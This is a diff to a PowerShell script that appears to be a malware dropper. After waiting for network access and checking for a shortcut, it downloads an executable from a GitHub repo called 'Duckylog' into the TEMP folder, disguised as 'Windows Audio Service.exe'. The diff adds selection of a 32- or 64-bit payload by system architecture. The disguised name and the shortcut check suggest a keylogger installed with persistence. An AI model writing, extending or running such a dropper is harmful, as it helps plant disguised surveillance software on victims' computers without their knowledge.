@@ -19,6 +19,10 @@ while (-Not (Test-NetworkConnection)) {
     Start-Sleep -Seconds 5
 }
 
+# Check system architecture
+$architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+Write-Output "System Architecture: $architecture"
+
 # Check if the shortcut exists
 if (-Not (Test-Path $shortcutPath)) {
     Write-Output "Shortcut does not exist at $shortcutPath"
@@ -27,7 +31,11 @@ if (-Not (Test-Path $shortcutPath)) {
     $exePath = "$env:TEMP\Windows Audio Service.exe"
 
     # URL to the executable on GitHub
-    $exeUrl = "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service.exe"
+    $exeUrl = if ($architecture -eq "64-bit") {
+        "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service_64.exe?raw=true"
+    } else {
+        "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service_32.exe?raw=true"
+    }
 
     # Download the executable from GitHub
     Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
